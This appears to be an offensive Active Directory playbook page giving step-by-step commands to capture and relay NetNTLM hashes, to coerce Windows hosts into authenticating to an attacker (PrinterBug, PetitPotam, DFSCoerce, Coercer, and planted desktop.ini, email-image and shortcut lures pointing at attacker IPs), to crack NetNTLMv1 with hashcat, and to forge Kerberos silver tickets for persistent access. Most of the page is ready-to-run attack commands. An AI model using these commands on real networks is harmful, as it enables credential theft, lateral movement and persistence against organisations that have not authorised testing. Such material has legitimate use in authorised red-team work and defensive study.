## Capture NetNTLM hashes [t-ad-ntlm-capture_ntlm_hashes]

NetNTLM hashes can be grabbed and bruteforced

###  Start service to capture incoming NetNTLM requests




**option 1: responder**

{% code overflow="wrap" %}
```bash
sudo python3 Responder.py -I eth0 --disable-ess --lm
```
{% endcode %}

{% hint style="info" %}The config file should be changed to use the challenge 1122334455667788

lm flag is using to downgrade the protocol, but it can prevent the remote server to send any requests. The best approach is to make 2 attempts - with and without the flag.

Due to some issues in the code IPv6 should be enabled on the interface, otherwise you could have port access errors

{% endhint %}


**option 2: impacket_ntlmrelayx.py**

{% code overflow="wrap" %}
```bash
ntlmrelayx.py -ntlmchallenge 1122334455667788 -of hashes.txt
```
{% endcode %}

{% hint style="info" %}it doesn't have many option, but can be useful if other tools are not available

{% endhint %}

## NTLM Authentication Coercion Methods [t-ad-ntlm-coerced_authentication_methods]

In Active Directory domains, attackers often rely on coerced authentications techniques, 
especially when attempting authentication relaying attacks (e.g. NTLM relay) or when abusing Kerberos delegations.
These techniques enable attackers to redirect traffic or redirect/force targets authentications. 
Attackers will then be able, in certain cases, to capture credentials or relay authentications.

The coerced authentications are made over SMB. But MS-RPRN abuse can be combined with WebClient 
abuse to elicit incoming authentications made over HTTP which heightens NTLM relay capabilities.

It is usually used to get and crack NetNTLM hashes or relay request to other services, but
can be also used for local privilege escalation.

There are some well known options:

1. MS-RPRN abuse (PrinterBug). 
Microsoft's Print Spooler is a service handling the print jobs and other various tasks 
related to printing. An attacker controling a domain user/computer can, with a specific RPC call, 
trigger the spooler service of a target running it and make it authenticate to a target of the attacker's 
choosing. This flaw is a "won't fix" and enabled by default on all Windows environments.

2. MS-EFSR abuse (PetitPotam)
Allows to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.
Abuse Microsoft's Encrypting File System Remote protocol available through \pipe\efsrpc, \pipe\lsarpc, 
\pipe\samr, \pipe\lsass and \pipeetlogon SMB named pipes.
Partially patched by Microsoft (CVE-2021-36942), but some of the MS-EFSR's methods are still accessible and vulnerable.

3. MS-DFSNM abuse (DFSCoerce)
Abuses Microsoft's Distributed File System Namespace Management protocol available through the \pipeetdfs SMB name pipe.
Vulnerable methods: NetrDfsRemoveStdRoot, NetrDfsAddStdRoot.

4. MS-FSRVP abuse (ShadowCoerce)
Abuses Microsoft's File Server Remote VSS available through the \pipe\FssagentRpc SMB named 
pipe (creating shadow copies of file shares on a remote computer). Service should be enabled on the target server, 
patched in June 2022 (CVE-2022-30154).

5. Windows Search Protocol (WSPCoerce)
Note: The Windows Search Service is NOT enabled by default on Windows Server so in practice 
this attack is only effective against Windows workstations.


###  Send the request to one of the vulnerable services




**option 1: dementor.py (PrinterBug)**

{% code overflow="wrap" %}
```bash
dementor.py -d domain.local -u user -p 'Password123' attacker_ip victim_ip

#for mass sending
for ip in `cat 445_ip.txt`; do python3 dementor.py -d domain -u user -p P@ssw0rd attacker_ip $ip;done

```
{% endcode %}

{% hint style="info" %}for webdav use shadow@80/test.txt as an attacker host


{% endhint %}


**option 2: PetitPotam.py (topotam)**

{% code overflow="wrap" %}
```bash
PetitPotam.py -u da -p 'P@ssw0rd' -d domain.local shadow@80/test.txt <target.domain.local> -pipe all
```
{% endcode %}

{% hint style="info" %}Null session can be use if not patched -d '' -u '' -p ''

{% endhint %}


**option 3: petitpotam.py (ly4k, PetitPotam)**

{% code overflow="wrap" %}
```bash
python3 petitpotam.py -debug 'user:Password123@victim-ip' '\attacker-ip\share\foo'

```
{% endcode %}


**option 4: dfscoerce.py**

{% code overflow="wrap" %}
```bash
python3 dfscoerce.py -d "pthub" -u "user" -p "Password123" attackerip victim-ip

```
{% endcode %}


**option 5: Coercer**

{% code overflow="wrap" %}
```bash
python3 Coercer.py coerce -l <attacker_ip> -t <target_ip> -u '<username>' -p '<password>' -d domain.com -v

```
{% endcode %}


**option 6: desktop.ini**

{% code overflow="wrap" %}
```bash
Put desktop.ini fine on a shared or user`s folder:

[.ShellClassInfo]
IconFile=\\10.10.16.153\aa
IconIndex=1337

```
{% endcode %}


**option 7: 1x1 Images in Emails**

{% code overflow="wrap" %}
```bash
<img src="\\10.10.123.102\test.ico" height="1" width="1" />

```
{% endcode %}


**option 8: Windows Shortcuts**

{% code overflow="wrap" %}
```bash
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.123.102\test.ico"
$shortcut.Save()

```
{% endcode %}

## Crack NetNTLMv1 hashes locally [t-ad-ntlm-netntlmv1_hashes_cracking]

NetNTLMv1 uses the Data Encryption Standard (DES) algorithm as part of its hash computation process.
The hash NT (16bytes) is divided in 3 parts of 7bytes each.

Modern hardware, especially GPUs, can compute DES hashes very quickly, which makes brute force attacks 
even more effective. Moreover, there are many readily available software tools that are designed 
to crack NetNTLMv1 hashes.



{% hint style="info" %}For NTLMv1 with ESS/SSP the process is a bit different, check the references
If it was not possible to crack the hash, NTLM relay technique can be used
{% endhint %}
### 1.1.1 Use NTLMv1 Multitool to convert the NetNTLMv1 response to a proper hash



{% code overflow="wrap" %}
```bash
python3 ntlmv1.py --ntlmv1 hashcat::HOSTNAME:<PART1>:<PART2>:<CHALLANGE>
```
{% endcode %}

{% hint style="info" %}<CHALLANGE> is usually 1122334455667788

{% endhint %}

### 1.1.2 Calculate final 4 characters (CT3)



{% code overflow="wrap" %}
```bash
./ct3_to_ntlm.bin <CT3> <CHALLANGE>
```
{% endcode %}

### 1.1.3 Crack 2 parts with hashcat



{% code overflow="wrap" %}
```bash
To crack with hashcat create a file with the following contents:
<CT1>:1122334455667788
<CT2>:1122334455667788

./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

```
{% endcode %}

## Silver Ticket [t-ad-kerberos-forging_silver_ticket]

Silver Tickets allows to access the host if it's password hash is compromised.
Service Tickets are encrypted based on the service kerberos key. If the service account is compromised it`s possible to craft arbitary tickets with any user or privileges. For services runing as a system account PAC validation (for the KDC checksum) is not occurred.
The computer accounts reset their passwords every 30 days by default and the process is initiated by the computer itself. By cahgning registry key *HKEY_LOCAL_MACHINE it`s possible to disable the password update. It allows to to persist access even after all other password are changed, that makes Silver Ticket attack a perfect persistance technique as well.

### 1.1.1 Get the domain SID




**option 1: impacket-lookupsid**

{% code overflow="wrap" %}
```bash
impacket-lookupsid domain.com/user@dc.domain.com
```
{% endcode %}


**option 2: whoami**

{% code overflow="wrap" %}
```bash
whoami /all
```
{% endcode %}

{% hint style="info" %}Domain SID is the User`s sid without the last part

{% endhint %}

### 1.1.2 Forge a TGS ticket (silver ticket) using the computer`s NT password hash




**option 1: ticketer.py**

{% code overflow="wrap" %}
```bash
ticketer.py -nthash <computer_nthash> -domain-sid <domain-sid> -domain domain.com -spn cifs/server.domain.com -groups 512 tester
```
{% endcode %}


**option 2: Rubeus**

{% code overflow="wrap" %}
```bash
Rubeus.exe silver /service:host/server.domain.com /user:user /rc4:<NTHASH> /sid:<domain SID>
```
{% endcode %}

### 1.1.3 Use any kerberos-aware tool to access the server



{% code overflow="wrap" %}
```bash
KRB5CCNAME=tester.ccache wmiexec.py -k server.domain.com
```
{% endcode %}

